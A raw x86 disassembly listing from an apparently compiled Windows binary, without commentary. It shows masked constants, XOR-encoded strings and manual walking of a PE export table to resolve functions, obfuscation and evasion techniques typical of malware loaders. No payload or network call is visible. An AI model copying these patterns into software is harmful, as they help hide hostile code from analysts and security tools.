  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
